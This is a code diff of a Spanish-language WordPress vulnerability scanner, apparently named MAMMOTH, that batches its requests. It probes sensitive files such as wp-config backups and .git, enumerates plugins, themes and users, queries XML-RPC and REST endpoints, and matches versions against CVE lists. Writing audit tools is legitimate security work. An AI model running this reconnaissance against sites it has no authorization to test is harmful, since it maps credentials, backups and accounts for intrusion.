-  if(mem && mem.lastVersion){ alog('\u2139 perfil previo de ' + esc(S.host) + ': WP ' + esc(mem.lastVersion) + ' (' + (mem.pluginsCount||0) + ' plugins, ' + (mem.usersCount||0) + ' usuarios en la última corrida)'); }
+  alog('target: ' + esc(url) + ' \u00b7 scope autorizado (' + esc(S.host) + ') \u00b7 transporte batch edge ×' + MMT_BATCH_SIZE);
+  if(mem && mem.lastVersion){
+    alog('\u2139 perfil previo de ' + esc(S.host) + ': WP ' + esc(mem.lastVersion) + ' (' + (mem.pluginsCount||0) + ' plugins, ' + (mem.usersCount||0) + ' usuarios)');
+  }
   var totalWeapons = MMT_FILES.length + MMT_PLUGINS.length + MMT_THEMES.length + MMT_REST.length + 25 + MMT_CORE_CVES.length + MMT_PLUG_CVES.length;
-  alog('arsenal: ' + (MMT_FILES.length) + ' rutas sensibles \u00b7 ' + MMT_PLUGINS.length + ' plugins \u00b7 ' + MMT_THEMES.length + ' themes \u00b7 ' + MMT_REST.length + ' REST probes \u00b7 author enum \u00d725 \u00b7 CVE matrix core ' + MMT_CORE_CVES.length + ' + plugins ' + MMT_PLUG_CVES.length + ' \u2192 ' + totalWeapons + ' VECTORES WordPress');
+  alog('arsenal: ' + MMT_FILES.length + ' rutas sensibles \u00b7 ' + MMT_PLUGINS.length + ' plugins \u00b7 ' + MMT_THEMES.length + ' themes \u00b7 ' + MMT_REST.length + ' REST probes \u00b7 author enum ×25 \u00b7 CVE matrix core ' + MMT_CORE_CVES.length + ' + plugins ' + MMT_PLUG_CVES.length + ' \u2192 ' + totalWeapons + ' VECTORES WordPress');
 
   var ctrlPath = 'mammoth-ctrl-' + Math.floor(Math.random() * 1e9) + '.html';
 
-  /* ── P0: baseline + confirmación WP ── */
-  alog('\u2500\u2500 P0 BASELINE \u2014 confirmación WordPress + soft-404 control \u2500\u2500');
-  Promise.all([ mmtFetch(url + "\u002f", 'GET'), mmtFetch(url + "\u002f" + ctrlPath, 'GET') ])
+  /* ── P0: baseline + confirmación multi-fuente WordPress en 1 solo batch edge ── */
+  alog('\u2500\u2500 P0 BASELINE \u2014 confirmación multi-fuente WordPress + control anti-soft-404 \u2500\u2500');
+  mmtBatchChunk([
+    { url: url + "\u002f", method: 'GET' },
+    { url: url + "\u002f" + ctrlPath, method: 'GET' },
+    { url: url + "\u002fwp-json\u002f", method: 'GET' },
+    { url: url + "\u002fwp-login.php", method: 'GET' }
+  ])
     .then(function(rs){
-      S.requests += 2;
-      var home = rs[0];
-      S.softCtrl = { status: home.status, sig: ctrlSignature(rs[1]) };
-      if(!p0Confirm(home)){
-        alog('\u274c ' + esc(S.host) + " NO parece WordPress (sin wp-content\u002fwp-includes\u002fwp-json\u002fgenerator). Motor honesto: NO se inventa hallazgos — corrección: target WP real.", 'mmt-err');
-        mmtFinish(false);
+      if(aborted) return;
+      S.requests += 4;
+      var home = rs[0], ctrl = rs[1], wpJson = rs[2], wpLogin = rs[3];
+      S.wpJsonPrefetch = wpJson;
+      S.softCtrl = { status: home.status, sig: ctrlSignature(ctrl) };
+      mmtSetProgress(6, 'P0 · Baseline recibida (' + (home.status || 'sin respuesta') + ')');
+
+      if(home.status === 0 && wpJson.status === 0 && wpLogin.status === 0){
+        alog('\u274c ' + esc(S.host) + ' inalcanzable o sin respuesta HTTP (status 0). Verifica conectividad o URL.', 'mmt-err');
+        mmtFinish('unreachable');
+        return;
+      }
+      if(!p0Confirm(home, wpJson, wpLogin)){
+        alog('\u2139 ' + esc(S.host) + ' auditado en P0 (HTML, headers Link/Pingback, /wp-json/, /wp-login.php): NO es WordPress. Motor honesto: cero falsos positivos.', 'mmt-warn');
+        mmtFinish('not-wp');
         return;
       }
       p0Version(home);
       S.homeBody = home.body || '';
       alog('\u2705 WordPress CONFIRMADO en ' + esc(S.host));
       if(S.wpVersion) alog('\u2139 WP version: ' + S.wpVersion + ' (vía ' + S.versionSource + ')');
-      else alog("⚠ versión del core no visible en la home — se probarán fuentes alternativas (readme.html \u002f feed)");
-      return p1Recon().then(function(){ return p2Files(); }).then(function(){ return p3Plugins(); }).then(function(){ return p4Author(); }).then(function(){ return p5Rest(); }).then(function(){ return p6CveMatrix(); }).then(function(){ mmtFinish(true); });
+      else alog("⚠ versión del core oculta en la portada — probando readme.html, feed RSS2 y OPML en P1");
+
+      return p1Recon()
+        .then(function(){ if(!aborted) return p2Files(); })
+        .then(function(){ if(!aborted) return p3Plugins(); })
+        .then(function(){ if(!aborted) return p4Author(); })
+        .then(function(){ if(!aborted) return p5Rest(); })
+        .then(function(){ if(!aborted) return p6CveMatrix(); })
+        .then(function(){ if(!aborted) mmtFinish('completed'); });
     })
-    .catch(function(e){ alog('\u274c error de corrida: ' + esc(e.message || e), 'mmt-err'); mmtFinish(false); });
+    .catch(function(e){
+      if(!aborted){
+        alog('\u274c error inesperado en motor MAMMOTH: ' + esc(e && e.message ? e.message : String(e)), 'mmt-err');
+        mmtFinish('error');
+      }
+    });
 }
 
-/* ── P1: recon tecnología (versión alt, theme, plugins pasivos) ── */
+/* ── P1: recon tecnología (versión alt en paralelo, theme, plugins pasivos) ── */
 function p1Recon(){
+  if(aborted) return Promise.resolve();
+  mmtSetProgress(8, 'P1 · Fingerprinting Core, Feeds & Pasivos');
   alog('\u2500\u2500 P1 RECON \u2014 tecnología WordPress \u2500\u2500');
-  var jobs = [];
-  if(!S.wpVersion){
-    jobs.push(mmtFetch(S.url + "\u002freadme.html", 'GET').then(function(r){
-      S.requests++;
-      if(r.status === 200 && !pageLooks404(r)){
-        var m = (r.body||'').match(/Version ([0-9.]+)/i);
-        if(m){ S.wpVersion = m[1]; S.versionSource = 'readme.html'; alog('\u2705 versión por readme.html: ' + S.wpVersion); }
-      }
-      return mmtFetch(S.url + "\u002f?feed=rss2", 'GET').then(function(r2){
-        S.requests++;
-        var m2 = (r2.body||'').match(/\x3cgenerator\x3ehttps?:\/\/wordpress\.org\/\?v=([0-9.]+)\x3c\/generator\x3e/i);
-        if(!S.wpVersion && m2){ S.wpVersion = m2[1]; S.versionSource = 'feed rss2'; alog('\u2705 versión por feed rss2: ' + S.wpVersion); }
-      });
-    }));
-  }
-  return Promise.all(jobs).then(function(){
+  var pre = S.wpVersion ? Promise.resolve() : mmtBatchChunk([
+    { url: S.url + "\u002freadme.html", method: 'GET' },
+    { url: S.url + "\u002f?feed=rss2", method: 'GET' },
+    { url: S.url + "\u002fwp-links-opml.php", method: 'GET' }
+  ]).then(function(rs){
+    if(aborted) return;
+    S.requests += 3;
+    var r1 = rs[0], r2 = rs[1], r3 = rs[2];
+    if(!S.wpVersion && r1.status === 200 && !pageLooks404(r1)){
+      var m1 = (r1.body||'').match(/Version ([0-9.]+)/i);
+      if(m1){ S.wpVersion = m1[1]; S.versionSource = 'readme.html'; alog('\u2705 versión por readme.html: ' + S.wpVersion); }
+    }
+    if(!S.wpVersion && r2.body){
+      var m2 = r2.body.match(/\x3cgenerator\x3ehttps?:\/\/wordpress\.org\/\?v=([0-9.]+)\x3c\/generator\x3e/i);
+      if(m2){ S.wpVersion = m2[1]; S.versionSource = 'feed rss2'; alog('\u2705 versión por feed rss2: ' + S.wpVersion); }
+    }
+    if(!S.wpVersion && r3.body){
+      var m3 = r3.body.match(/generator="WordPress\/([0-9.]+)"/i);
+      if(m3){ S.wpVersion = m3[1]; S.versionSource = 'wp-links-opml.php'; alog('\u2705 versión por wp-links-opml.php: ' + S.wpVersion); }
+    }
+  });
+  return pre.then(function(){
+    if(aborted) return;
     var b = S.homeBody || '';
+    if(!S.wpVersion){
+      var mv = b.match(/wp-includes\/(?:js|css)\/[^"'?\s]*\?ver=([4-6]\.[0-9]+(?:\.[0-9]+)?)/i);
+      if(mv){ S.wpVersion = mv[1]; S.versionSource = 'asset ver (wp-includes)'; alog('\u2705 versión por asset wp-includes: ' + S.wpVersion); }
+    }
     var th = b.match(/wp-content\/themes\/([a-z0-9_-]+)\//i);
     if(th){ S.theme = th[1]; alog('\u2139 theme activo (pasivo): ' + S.theme); }
     var seen = {}, pl = b.match(/wp-content\/plugins\/([a-z0-9_-]+)\//gi) || [];
-    for(var i=0;i<pl.length;i++){ var m = pl[i].match(/plugins\/([a-z0-9_-]+)\//i); if(m && !seen[m[1]]){ seen[m[1]] = 1; S.passivePlugins.push(m[1]); } }
-    if(S.passivePlugins.length) alog('\u2139 plugins pasivos desde la home: ' + S.passivePlugins.join(', '));
-    else alog("⚠ home sin referencias a plugins (minificación\u002fproxy) — el enum activo lo resuelve");
+    for(var i=0;i<pl.length;i++){
+      var m = pl[i].match(/plugins\/([a-z0-9_-]+)\//i);
+      if(m && !seen[m[1]]){ seen[m[1]] = 1; S.passivePlugins.push(m[1]); }
+    }
+    if(S.passivePlugins.length) alog('\u2139 plugins pasivos desde el HTML: ' + S.passivePlugins.join(', '));
+    else alog("⚠ HTML sin rutas directas a plugins (minificación\u002fCDN) — iniciando enumeración activa en P3");
+    mmtSetProgress(10, 'P1 completado · Iniciando P2 Archivos Sensibles');
   });
 }
 
-/* ── P2: arsenal de archivos sensibles ── */
+/* ── P2: arsenal de 225 archivos sensibles en lotes Edge (10% → 42%) ── */
 function p2Files(){
-  alog('\u2500\u2500 P2 ARSENAL \u2014 ' + MMT_FILES.length + ' rutas sensibles (wp-config backups, dumps, debug.log, git) \u2500\u2500');
-  var done = 0;
-  return pool(MMT_FILES, function(f){
-    return mmtFetch(S.url + "\u002f" + f.path, 'GET').then(function(r){
-      S.requests++;
-      done++;
-      $('mmt-progress').style.width = Math.floor(done * 100 / MMT_FILES.length) + '%';
+  if(aborted) return Promise.resolve();
+  alog('\u2500\u2500 P2 ARSENAL \u2014 ' + MMT_FILES.length + ' rutas sensibles vía Edge Batch (wp-config backups, dumps, debug.log, .git) \u2500\u2500');
+  return mmtBatchPool(
+    MMT_FILES,
+    function(f){ return { url: S.url + "\u002f" + f.path, method: 'GET' }; },
+    function(f, r){
       if(hitFile(S.url, f, r)){
         S.filesHit.push(f);
         var sevCls = f.sev === 'CRITICAL' ? 'mmt-crit' : (f.sev === 'HIGH' ? 'mmt-high' : '');
-        var ev = f.sig === 'DB_PASSWORD' ? 'firma DB_PASSWORD presente (contenido NUNCA mostrado)' : ('firma ' + f.sig + ' presente');
+        var ev = f.sig === 'DB_PASSWORD' ? 'firma DB_PASSWORD presente (contenido redactado)' : ('firma ' + f.sig + ' presente');
         alog((f.sev === 'CRITICAL' ? '\u2620' : '\u26a0') + ' [' + f.sev + '] ' + f.path + ' \u2014 ' + esc(f.desc) + ' \u00b7 ' + ev, sevCls);
         mmtBus('wordpress sensitive file exposure', (f.sev === 'CRITICAL' ? 'CONFIRMADO' : 'DETECTADO'), ev + ' \u00b7 ' + f.desc, S.url + "\u002f" + f.path, f.sev);
-        if(f.sig === 'DB_PASSWORD'){ /* cero dump: solo firma */ }
       }
-    });
-  }, 6).then(function(){
-    alog('\u2139 P2 listo: ' + S.filesHit.length + ' archivo(s) sensible(s) expuesto(s)');
+    },
+    10, 32, 'P2 · Archivos sensibles'
+  ).then(function(){
+    if(!aborted) alog('\u2139 P2 completado: ' + S.filesHit.length + ' archivo(s) sensible(s) confirmado(s)');
   });
 }
 
-/* ── P3: enumeración activa plugins + themes (readme.txt / style.css) ── */
+/* ── P3: enumeración activa 271 plugins + 69 themes en lotes Edge (42% → 82%) ── */
 function p3Plugins(){
-  alog('\u2500\u2500 P3 ENUM \u2014 ' + MMT_PLUGINS.length + ' plugins + ' + MMT_THEMES.length + " themes (readme.txt \u002f style.css) ──");
-  var targets = MMT_PLUGINS.map(function(slug){ return { kind:'plugin', slug: slug }; })
-    .concat(MMT_THEMES.map(function(slug){ return { kind:'theme', slug: slug }; }));
-  var done = 0;
-  return pool(targets, function(t){
-    var path = t.kind === 'plugin'
-      ? S.url + "\u002fwp-content\u002fplugins\u002f" + t.slug + "\u002freadme.txt"
-      : S.url + "\u002fwp-content\u002fthemes\u002f" + t.slug + "\u002fstyle.css";
-    return mmtFetch(path, 'GET').then(function(r){
-      S.requests++;
-      done++;
-      if(done % 24 === 0) $('mmt-progress').style.width = Math.min(99, Math.floor(done * 100 / targets.length)) + '%';
+  if(aborted) return Promise.resolve();
+  var extraSlugs = S.passivePlugins.filter(function(slug){ return MMT_PLUGINS.indexOf(slug) < 0; });
+  var allPlugins = extraSlugs.concat(MMT_PLUGINS);
+  var allThemes = (S.theme && MMT_THEMES.indexOf(S.theme) < 0 ? [S.theme] : []).concat(MMT_THEMES);
+  alog('\u2500\u2500 P3 ENUM \u2014 ' + allPlugins.length + ' plugins + ' + allThemes.length + " themes (readme.txt \u002f style.css) ──");
+  var targets = allPlugins.map(function(slug){ return { kind:'plugin', slug: slug }; })
+    .concat(allThemes.map(function(slug){ return { kind:'theme', slug: slug }; }));
+  return mmtBatchPool(
+    targets,
+    function(t){
+      return {
+        url: t.kind === 'plugin'
+          ? S.url + "\u002fwp-content\u002fplugins\u002f" + t.slug + "\u002freadme.txt"
+          : S.url + "\u002fwp-content\u002fthemes\u002f" + t.slug + "\u002fstyle.css",
+        method: 'GET'
+      };
+    },
+    function(t, r){
       if(r.status !== 200 || pageLooks404(r)) return;
       var b = r.body || '';
       if(t.kind === 'plugin'){
-        var m = b.match(/Stable tag:\s*([0-9.]+)/i);
+        if(!/===s|Contributors:|Stable tag:|Requires at least:|Tested up to:|License:/i.test(b)) return;
+        var m = b.match(/Stable tag:\s*([0-9][0-9a-zA-Z._-]*)/i);
         var ver = m ? m[1] : '?';
         S.plugins[t.slug] = ver;
         alog('\u2705 plugin: ' + t.slug + ' v' + ver, 'mmt-ok');
       } else {
         var mn = b.match(/Theme Name:\s*(.+)/i);
-        var mv = b.match(/Version:\s*([0-9.]+)/i);
-        if(mn){ S.themes[t.slug] = (mv ? mv[1] : '?'); alog('\u2705 theme: ' + t.slug + ' (' + (mn[1]||'').trim() + (mv ? ' v' + mv[1] : '') + ')', 'mmt-ok'); }
+        var mv = b.match(/Version:\s*([0-9][0-9a-zA-Z._-]*)/i);
+        if(mn){
+          S.themes[t.slug] = (mv ? mv[1] : '?');
+          alog('\u2705 theme: ' + t.slug + ' (' + esc((mn[1]||'').trim()) + (mv ? ' v' + mv[1] : '') + ')', 'mmt-ok');
+        }
       }
-    });
-  }, 8).then(function(){
-    alog('\u2139 P3 listo: ' + Object.keys(S.plugins).length + ' plugins + ' + Object.keys(S.themes).length + ' themes enumerados');
+    },
+    42, 40, 'P3 · Plugins y Themes'
+  ).then(function(){
+    if(!aborted) alog('\u2139 P3 completado: ' + Object.keys(S.plugins).length + ' plugins + ' + Object.keys(S.themes).length + ' themes enumerados');
   });
 }
 
-/* ── P4: enumeración de usuarios (?author=N + REST + xmlrpc) ── */
+/* ── P4: enumeración de usuarios (?author=1..25 Batch + REST users + XML-RPC) (82% → 91%) ── */
 function p4Author(){
-  alog('\u2500\u2500 P4 USERS \u2014 ?author=1..25 (Location leak) + REST users + xmlrpc \u2500\u2500');
+  if(aborted) return Promise.resolve();
+  alog('\u2500\u2500 P4 USERS \u2014 ?author=1..25 (Batch) + REST users + XML-RPC \u2500\u2500');
   var ids = [];
   for(var i=1;i<=25;i++) ids.push(i);
-  return pool(ids, function(i){
-    return mmtFetch(S.url + "\u002f?author=" + i, 'GET').then(function(r){
-      S.requests++;
+  return mmtBatchPool(
+    ids,
+    function(i){ return { url: S.url + "\u002f?author=" + i, method: 'GET' }; },
+    function(i, r){
       var loc = (r.headers && (r.headers['location'] || r.headers['Location'])) || '';
-      var m = (loc || (r.finalUrl||'')).match(/\/author\/([^\/?#]+)\//i);
+      var m = (loc || (r.finalUrl||'')).match(/\/author\/([^\/?#]+)\/?/i);
       if(!m && r.status === 200 && !pageLooks404(r)){
         var mb = (r.body||'').match(/\/author\/([a-z0-9._-]+)\//i);
         if(mb) m = mb;
       }
       if(m && S.users.indexOf(m[1]) < 0){
         S.users.push(m[1]);
-        alog('\u2705 usuario #' + i + ': ' + m[1] + ' (author archive leak)', 'mmt-ok');
+        alog('\u2705 usuario #' + i + ': ' + esc(m[1]) + ' (author archive leak)', 'mmt-ok');
       }
-    });
-  }, 4).then(function(){
-    return mmtFetch(S.url + "\u002fwp-json\u002fwp\u002fv2\u002fusers", 'GET').then(function(r){
-      S.requests++;
+    },
+    82, 6, 'P4 · Enumeración de usuarios'
+  ).then(function(){
+    if(aborted) return;
+    return Promise.all([
+      mmtFetch(S.url + "\u002fwp-json\u002fwp\u002fv2\u002fusers", 'GET'),
+      mmtFetch(S.url + "\u002fxmlrpc.php", 'POST', "\u003c?xml version=\"1.0\"?\u003e\u003cmethodCall\u003e\u003cmethodName\u003esystem.listMethods\u003c\u002fmethodName\u003e\u003cparams\u003e\u003c\u002fparams\u003e\u003c\u002fmethodCall\u003e", { 'Content-Type': "text\u002fxml" })
+    ]).then(function(pair){
+      if(aborted) return;
+      S.requests += 2;
+      var r = pair[0], rx = pair[1];
       if(r.status === 200 && (r.body||'').indexOf('"slug"') >= 0 && !pageLooks404(r)){
         try {
           var arr = JSON.parse(r.body);
           for(var j=0;j<arr.length;j++){ if(arr[j] && arr[j].slug && S.users.indexOf(arr[j].slug) < 0) S.users.push(arr[j].slug); }
-          alog("✅ REST \u002fwp-json\u002fwp\u002fv2\u002fusers ABIERTO — " + arr.length + ' usuarios (los usernames ya son públicos via author archives, pero el endpoint abierto lo acelera todo)', 'mmt-high');
+          alog("✅ REST \u002fwp-json\u002fwp\u002fv2\u002fusers ABIERTO — " + arr.length + ' usuarios enumerados', 'mmt-high');
           mmtBus('wordpress user enumeration', 'CONFIRMADO', 'REST users endpoint abierto \u2014 ' + arr.length + ' usuarios', S.url + "\u002fwp-json\u002fwp\u002fv2\u002fusers", 'MEDIUM');
         } catch(e){}
       } else {
-        alog('\u2139 REST users endpoint filtrado o cerrado (bien para el target)');
+        alog('\u2139 REST users endpoint filtrado o cerrado');
       }
-    }).then(function(){
-      return mmtFetch(S.url + "\u002fxmlrpc.php", 'POST', "\u003c?xml version=\"1.0\"?\u003e\u003cmethodCall\u003e\u003cmethodName\u003esystem.listMethods\u003c\u002fmethodName\u003e\u003cparams\u003e\u003c\u002fparams\u003e\u003c\u002fmethodCall\u003e", { 'Content-Type': "text\u002fxml" });
-    }).then(function(r){
-      S.requests++;
-      var b = r.body || '';
-      if(r.status === 200 && b.indexOf("\u003cname\u003e") >= 0){
+      var xb = rx.body || '';
+      if(rx.status === 200 && xb.indexOf("\u003cname\u003e") >= 0){
         S.xmlrpc.alive = true;
-        var methods = b.match(/\x3cname\x3e[a-zA-Z0-9_.]+\x3c\/name\x3e/g) || [];
+        var methods = xb.match(/\x3cname\x3e[a-zA-Z0-9_.]+\x3c\/name\x3e/g) || [];
         S.xmlrpc.methods = methods.length;
-        S.xmlrpc.multicall = b.indexOf('system.multicall') >= 0;
-        S.xmlrpc.pingback = b.indexOf('pingback.ping') >= 0;
-        alog('\u26a0 XML-RPC VIVO \u2014 ' + methods.length + ' m\u00e9todos \u00b7 multicall: ' + (S.xmlrpc.multicall ? "SÍ (×1.999 guesses\u002frequest sin rate-limit per-request)" : 'no') + ' \u00b7 pingback: ' + (S.xmlrpc.pingback ? "SÍ (superficie SSRF\u002fDDoS amplificado)" : 'no'), 'mmt-high');
+        S.xmlrpc.multicall = xb.indexOf('system.multicall') >= 0;
+        S.xmlrpc.pingback = xb.indexOf('pingback.ping') >= 0;
+        alog('\u26a0 XML-RPC VIVO \u2014 ' + methods.length + ' m\u00e9todos \u00b7 multicall: ' + (S.xmlrpc.multicall ? "SÍ" : 'no') + ' \u00b7 pingback: ' + (S.xmlrpc.pingback ? "SÍ" : 'no'), 'mmt-high');
         mmtBus('wordpress xmlrpc attack surface', 'DETECTADO', 'xmlrpc.php vivo \u00b7 ' + methods.length + ' m\u00e9todos \u00b7 multicall ' + (S.xmlrpc.multicall ? 's\u00ed' : 'no'), S.url + "\u002fxmlrpc.php", 'MEDIUM');
       } else {
-        alog('\u2139 xmlrpc.php cerrado o filtrado (bien para el target)');
+        alog('\u2139 xmlrpc.php cerrado o filtrado');
       }
+      mmtSetProgress(91, 'P4 completado · Iniciando P5 Superficie REST');
     });
   });
 }
 
-/* ── P5: superficies REST activas (batch endpoint wp2shell, oembed) ── */
+/* ── P5: superficies REST activas en Batch (91% → 98%) ── */
 function p5Rest(){
+  if(aborted) return Promise.resolve();
   alog('\u2500\u2500 P5 REST SURFACE \u2014 namespaces + batch endpoint (wp2shell) + oembed proxy \u2500\u2500');
-  return mmtFetch(S.url + "\u002fwp-json\u002f", 'GET').then(function(r){
-    S.requests++;
-    if(r.status === 200){
+  var rootPromise = S.wpJsonPrefetch ? Promise.resolve(S.wpJsonPrefetch) : mmtFetch(S.url + "\u002fwp-json\u002f", 'GET').then(function(r){ S.requests++; return r; });
+  return rootPromise.then(function(r){
+    if(aborted) return;
+    if(r && r.status === 200){
       try {
         var j = JSON.parse(r.body);
-        if(j && j.namespaces){ S.restNamespaces = j.namespaces; alog('\u2139 REST namespaces (' + j.namespaces.length + '): ' + j.namespaces.slice(0, 14).join(', ') + (j.namespaces.length > 14 ? ' \u2026' : '')); }
+        if(j && j.namespaces){
+          S.restNamespaces = j.namespaces;
+          alog('\u2139 REST namespaces (' + j.namespaces.length + '): ' + esc(j.namespaces.slice(0, 14).join(', ')) + (j.namespaces.length > 14 ? ' \u2026' : ''));
+        }
       } catch(e){}
     }
-    return pool(MMT_REST, function(ep){
-      return mmtFetch(S.url + "\u002f" + ep.path, 'GET').then(function(r2){
-        S.requests++;
-        if(r2.status !== 404 && !pageLooks404(r2)){
+    return mmtBatchPool(
+      MMT_REST,
+      function(ep){ return { url: S.url + "\u002f" + ep.path, method: 'GET' }; },
+      function(ep, r2){
+        if(r2.status > 0 && r2.status !== 404 && !pageLooks404(r2)){
           S.restHits[ep.id] = true;
-          if(ep.id === 'rest-users' && (r2.body||'').indexOf('"slug"') >= 0) return; /* ya reportado en P4 */
-          alog('\u2139 REST superficie: ' + ep.path + ' \u2014 ' + ep.desc, 'mmt-note');
+          if(ep.id === 'rest-users' && (r2.body||'').indexOf('"slug"') >= 0) return;
+          alog('\u2139 REST superficie [' + r2.status + ']: ' + ep.path + ' \u2014 ' + esc(ep.desc), 'mmt-note');
           if(ep.id === 'rest-oembed'){
-            mmtBus('wordpress oembed proxy surface', 'DETECTADO', "oembed\u002f1.0\u002fproxy presente — superficie SSRF (CHIMERA hace el sondeo profundo)", S.url + "\u002f" + ep.path, 'MEDIUM');
+            mmtBus('wordpress oembed proxy surface', 'DETECTADO', "oembed\u002f1.0\u002fproxy presente — superficie SSRF", S.url + "\u002f" + ep.path, 'MEDIUM');
           }
         }
-      });
-    }, 3);
+      },
+      91, 7, 'P5 · Superficie REST API'
+    );
   });
 }
 
-/* ── P6: matriz CVE (core por versión + plugins/themes por versión) ── */
+/* ── P6: matriz CVE (core por versión + plugins/themes por versión) (98% → 100%) ── */
 function p6CveMatrix(){
+  if(aborted) return Promise.resolve();
+  mmtSetProgress(99, 'P6 · Correlacionando matriz CVE');
   alog('\u2500\u2500 P6 CVE MATRIX \u2014 core ' + MMT_CORE_CVES.length + ' CVEs version-mapped + ' + MMT_PLUG_CVES.length + ' CVEs de plugins \u2500\u2500');
   if(!S.wpVersion){
     alog('\u26a0 versión del core no determinada \u2014 la matriz core se salta HONESTAMENTE (no se adivina)');
@@ -14733,12 +15303,11 @@ function p6CveMatrix(){
     }
     if(!S.coreCves.length) alog('\u2705 core ' + S.wpVersion + ': fuera de los rangos de la matriz \u2014 sin exposiciones conocidas version-based');
   }
-  /* plugins */
   var installed = {};
   var pk;
   for(pk in S.plugins) installed[pk] = S.plugins[pk];
   for(var t=0;t<S.passivePlugins.length;t++) if(!installed[S.passivePlugins[t]]) installed[S.passivePlugins[t]] = '?';
-  for(var tk in S.themes) if(installed[tk] === undefined) installed[tk] = S.themes[tk]; /* FIX v2: themes instalados ahora entran al mapa CVE */
+  for(var tk in S.themes) if(installed[tk] === undefined) installed[tk] = S.themes[tk];
   for(var i2=0;i2<MMT_PLUG_CVES.length;i2++){
     var pc = MMT_PLUG_CVES[i2];
     var ver = installed[pc.slug];
@@ -14750,63 +15319,101 @@ function p6CveMatrix(){
       mmtBus('wordpress plugin CVE exposure', ver === '?' ? 'POSIBLE (plugin presente, versi\u00f3n desconocida)' : ('VULNERABLE POR VERSI\u00d3N \u2014 ' + pc.cve), pc.name + ' \u00b7 ' + (ver==='?' ? 'presente' : 'v'+ver), S.url + "\u002fwp-content\u002fplugins\u002f" + pc.slug + "\u002f", pc.sev);
     }
   }
-  if(!S.plugCves.length) alog('\u2705 plugins enumerados: ninguno matchea la matriz CVE (o no hay plugins vulnerables instalados)');
+  if(!S.plugCves.length) alog('\u2705 plugins enumerados: ninguno matchea la matriz CVE');
   return Promise.resolve();
 }
 
-/* ── veredicto + resumen ── */
-function mmtFinish(ran){
+/* ── veredicto + resumen definitivo 100% ── */
+function mmtFinish(mode){
   if(!S) return;
+  if(S._finished) return;
+  S._finished = true;
+  var ran = (mode === true || mode === 'completed');
+  S.status = typeof mode === 'string' ? mode : (ran ? 'completed' : 'stopped');
+  mmtSetUiRunning(false);
   S.elapsed = Math.round((Date.now() - S.t0) / 100) / 10;
+
   var crit = S.coreCves.filter(function(c){ return c.sev === 'CRITICAL'; }).length
             + S.plugCves.filter(function(c){ return c.sev === 'CRITICAL'; }).length
             + S.filesHit.filter(function(f){ return f.sev === 'CRITICAL'; }).length;
   var med  = S.filesHit.filter(function(f){ return f.sev === 'HIGH' || f.sev === 'MEDIUM'; }).length
             + S.plugCves.filter(function(c){ return c.sev !== 'CRITICAL'; }).length
             + S.coreCves.filter(function(c){ return c.sev !== 'CRITICAL'; }).length;
-  var verdict;
-  if(!ran) verdict = "CORRIDA ABORTADA \u002f TARGET NO WORDPRESS";
-  else if(S.wp2shell) verdict = '\u2620 WP2SHELL: EXPOSICI\u00d3N CR\u00cdTICA DEL CORE (pre-auth RCE version-based)';
-  else if(crit > 0) verdict = '\u2620 EXPOSICI\u00d3N CR\u00cdTICA: ' + crit + ' hallazgo(s) CRITICAL';
-  else if(med > 0) verdict = "⚠ EXPOSICIÓN MEDIA\u002fALTA: " + med + ' hallazgo(s)';
-  else if(S.users.length || S.xmlrpc.alive) verdict = "⚠ RECON OK — superficie informativa (users\u002fxmlrpc visibles), sin exposiciones confirmadas";
-  else verdict = '\u2705 TARGET ENDURECIDO: recon limpio, sin exposiciones confirmadas (m\u00e1s all\u00e1 de lo que la evidencia permite afirmar)';
+  var verdict, badgeLabel, badgeStyle;
+  if(mode === 'aborted'){
+    verdict = "⏹ AUDITORÍA DETENIDA POR EL OPERADOR (hallazgos parciales preservados)";
+    badgeLabel = "⏹ DETENIDO POR OPERADOR";
+    badgeStyle = "border-color:#ffb020;color:#ffb020;background:rgba(255,176,32,.14)";
+  } else if(mode === 'not-wp'){
+    verdict = "✅ ESCANEO FINALIZADO · Objetivo verificado NO es WordPress (cero falsos positivos)";
+    badgeLabel = "✅ FINALIZADO 100% · NO WP";
+    badgeStyle = "border-color:#00ffa3;color:#00ffa3;background:rgba(0,255,163,.12)";
+  } else if(mode === 'unreachable' || mode === 'error' || !ran){
+    verdict = "⚠ ESCANEO FINALIZADO · Objetivo inalcanzable o sin respuesta HTTP";
+    badgeLabel = "⚠ FINALIZADO · SIN RESPUESTA";
+    badgeStyle = "border-color:#ff4455;color:#ff4455;background:rgba(255,68,85,.14)";
+  } else if(S.wp2shell){
+    verdict = '\u2620 WP2SHELL: EXPOSICI\u00d3N CR\u00cdTICA DEL CORE (pre-auth RCE version-based)';
+    badgeLabel = "✅ FINALIZADO 100% · CRÍTICO";
+    badgeStyle = "border-color:#ff1a2e;color:#fff;background:rgba(255,26,46,.28)";
+  } else if(crit > 0){
+    verdict = '\u2620 EXPOSICI\u00d3N CR\u00cdTICA: ' + crit + ' hallazgo(s) CRITICAL';
+    badgeLabel = "✅ FINALIZADO 100% · " + crit + " CRITICAL";
+    badgeStyle = "border-color:#ff1a2e;color:#fff;background:rgba(255,26,46,.28)";
+  } else if(med > 0){
+    verdict = "⚠ EXPOSICIÓN MEDIA\u002fALTA: " + med + ' hallazgo(s)';
+    badgeLabel = "✅ FINALIZADO 100% · " + med + " HALLAZGOS";
+    badgeStyle = "border-color:#ffb020;color:#ffb020;background:rgba(255,176,32,.15)";
+  } else if(S.users.length || S.xmlrpc.alive){
+    verdict = "⚠ RECON OK — superficie informativa (users\u002fxmlrpc visibles), sin exposiciones críticas";
+    badgeLabel = "✅ ESCANEO FINALIZADO · 100%";
+    badgeStyle = "border-color:#00ffa3;color:#00ffa3;background:rgba(0,255,163,.14)";
+  } else {
+    verdict = '\u2705 TARGET ENDURECIDO: auditoría completa 6\u002f6 fases, sin exposiciones confirmadas';
+    badgeLabel = "✅ ESCANEO FINALIZADO · 100%";
+    badgeStyle = "border-color:#00ffa3;color:#00ffa3;background:rgba(0,255,163,.14)";
+  }
 
-    if(ran && crit >= 5){
-    verdict += ' \u2014 EXPOSICI\u00d3N TOTAL: ' + crit + ' hallazgos CRITICAL en un solo sitio (mapa completo de explotaci\u00f3n)';
-    alog('\u2620 EXPOSICI\u00d3N TOTAL: ' + crit + ' CRITICAL combinables entre s\u00ed \u2014 credenciales + backups + RCEs de plugins: el mapa completo de explotaci\u00f3n est\u00e1 a la vista', 'mmt-crit');
+  if(ran && crit >= 5){
+    verdict += ' \u2014 EXPOSICI\u00d3N TOTAL: ' + crit + ' hallazgos CRITICAL en un solo sitio';
+    alog('\u2620 EXPOSICI\u00d3N TOTAL: ' + crit + ' CRITICAL combinables entre s\u00ed \u2014 mapa completo de explotaci\u00f3n a la vista', 'mmt-crit');
   }
   S.verdict = verdict;
